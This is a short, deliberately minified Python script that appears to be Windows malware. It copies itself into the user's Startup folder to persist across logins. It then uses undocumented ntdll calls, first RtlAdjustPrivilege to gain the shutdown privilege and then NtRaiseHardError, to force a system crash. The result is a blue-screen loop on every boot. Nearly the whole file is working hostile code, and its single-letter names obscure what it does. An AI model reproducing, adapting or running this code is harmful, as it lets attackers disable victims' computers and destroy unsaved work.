K=False
import ctypes as C,sys as B
from ctypes import byref as D,c_bool as L,c_char_p as M
import os as A,shutil as N
if getattr(B,'frozen',K):E=A.path.dirname(B.executable)
else:E=A.path.dirname(A.path.abspath(__file__))
F=A.path.basename(B.argv[0])
G=A.path.join(E,F)
O=A.path.join(A.path.expanduser('~'),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')
H=A.path.join(O,F)
if A.path.abspath(G).lower()!=A.path.abspath(H).lower():
	with open(G,'rb')as P,open(H,'wb')as Q:N.copyfileobj(P,Q)
try:I=C.CDLL('ntdll.dll')
except OSError as U:B.exit()
J=C.c_bool
def R(xx,enable=True):A=I.RtlAdjustPrivilege(xx,J(enable),J(K),D(L(0)));return A==0
def S(error_code,options=6):I.NtRaiseHardError(error_code,0,0,0,options,D(M(0)))
T=19
if R(T):S(3221226005)
else:B.exit()